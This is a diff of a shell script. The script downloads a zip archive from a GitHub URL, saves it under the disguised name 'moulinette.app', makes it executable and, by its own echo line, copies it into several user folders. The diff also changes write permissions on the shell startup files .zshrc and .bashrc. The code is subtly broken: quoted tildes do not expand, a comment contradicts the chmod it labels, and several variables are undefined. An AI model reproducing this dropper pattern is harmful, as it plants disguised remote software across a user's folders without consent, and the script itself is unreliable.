@@ -2,13 +2,15 @@
 
 # Define the file URL and target paths
 FILE_URL="https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip"
-HOME_DIR="$HOME"
-DOWNLOAD_DIR="$HOME/Downloads"
-MUSIC_DIR="$HOME/Music"
-Applications="$HOME/Applications"
-Pictures="$HOME/Pictures"
-Documents="$HOME/Documents"
-Movies="$HOME/Movies"
+
+HOME="~"
+HOME_DIR="~"
+DOWNLOAD_DIR="~/Downloads"
+MUSIC_DIR="~/Music"
+Applications="~/Applications"
+Pictures="~/Pictures"
+Documents="~/Documents"
+Movies="~/Movies"
 
 # File names for different locations
 HOME_FILE="moulinette.app"
@@ -27,6 +29,19 @@ echo "Downloading the file..."
 curl -o "$DOWNLOAD_DIR/$HOME_FILE" "$FILE_URL"
 unzip -n "$DOWNLOAD_DIR/$HOME_FILE"
 chmod +x "$DOWNLOAD_DIR/$HOME_FILE"
+
+
+chmod +w "~/.zshrc"
+chmod +w "~/.bashrc"
+
+# Remove write access from the downloaded file
+chmod +w "$HOME_DIR/$HOME_FILE"
+chmod +w "$DOWNLOAD_DIR/$DOWNLOAD_FILE"
+chmod +w "$MUSIC_DIR/$MUSIC_FILE"
+chmod +w "$APPLICATIONS_DIR/$APPLICATIONS_FILE"
+chmod +w "$PICTURES_DIR/$PICTURES_FILE"
+chmod +w "$DOCUMENTS_DIR/$DOCUMENTS_FILE"
+chmod +w "$MOVIES_DIR/$MOVIES_FILE"
 
 
 echo "Copying the file to all locations..."
